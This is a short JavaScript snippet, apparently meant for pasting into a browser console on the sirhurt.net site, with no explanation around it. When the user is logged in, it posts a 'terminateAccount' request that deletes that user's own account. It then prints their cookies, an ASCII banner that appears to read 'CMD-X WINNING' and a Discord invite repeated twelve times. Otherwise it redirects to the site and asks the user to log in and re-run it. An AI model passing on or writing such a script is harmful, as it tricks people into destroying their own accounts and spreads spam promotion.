if (document.URL.includes("sirhurt"))
	if (document.cookie.split("; ")[1])
		$.ajax({type: "POST", url: "https://sirhurt.net/login/js-php/account.php", data: "oldp=DELETE&type=terminateAccount", contentType: "application/x-www-form-urlencoded", dataType: "json"})
		.always(function(garbage, response, responsejson) {
			console.log(`did the thing, site response: ${response} ${responsejson.responseText}\nyour cookies: ${document.cookie}\n  ______   __       __  _______          __    __        __       __  ______  __    __  __    __  ______  __    __   ______  \n /      \\ /  \\     /  |/       \\        /  |  /  |      /  |  _  /  |/      |/  \\  /  |/  \\  /  |/      |/  \\  /  | /      \\ \n/$$$$$$  |$$  \\   /$$ |$$$$$$$  |       $$ |  $$ |      $$ | / \\ $$ |$$$$$$/ $$  \\ $$ |$$  \\ $$ |$$$$$$/ $$  \\ $$ |/$$$$$$  |\n$$ |  $$/ $$$  \\ /$$$ |$$ |  $$ | ______$$  \\/$$/       $$ |/$  \\$$ |  $$ |  $$$  \\$$ |$$$  \\$$ |  $$ |  $$$  \\$$ |$$ | _$$/ \n$$ |      $$$$  /$$$$ |$$ |  $$ |/      |$$  $$<        $$ /$$$  $$ |  $$ |  $$$$  $$ |$$$$  $$ |  $$ |  $$$$  $$ |$$ |/    |\n$$ |   __ $$ $$ $$/$$ |$$ |  $$ |$$$$$$/  $$$$  \\       $$ $$/$$ $$ |  $$ |  $$ $$ $$ |$$ $$ $$ |  $$ |  $$ $$ $$ |$$ |$$$$ |\n$$ \\__/  |$$ |$$$/ $$ |$$ |__$$ |        $$ /$$  |      $$$$/  $$$$ | _$$ |_ $$ |$$$$ |$$ |$$$$ | _$$ |_ $$ |$$$$ |$$ \\__$$ |\n$$    $$/ $$ | $/  $$ |$$    $$/        $$ |  $$ |      $$$/    $$$ |/ $$   |$$ | $$$ |$$ | $$$ |/ $$   |$$ | $$$ |$$    $$/ \n $$$$$$/  $$/      $$/ $$$$$$$/         $$/   $$/       $$/      $$/ $$$$$$/ $$/   $$/ $$/   $$/ $$$$$$/ $$/   $$/  $$$$$$/  ${"\ndiscord.gg/cmdx".repeat(12)}`)})
	else
		console.error(`please log into your account and re-run the script`)
else {
	window.location.replace("https://sirhurt.net")
	console.error(`log in and re-run the script`)
}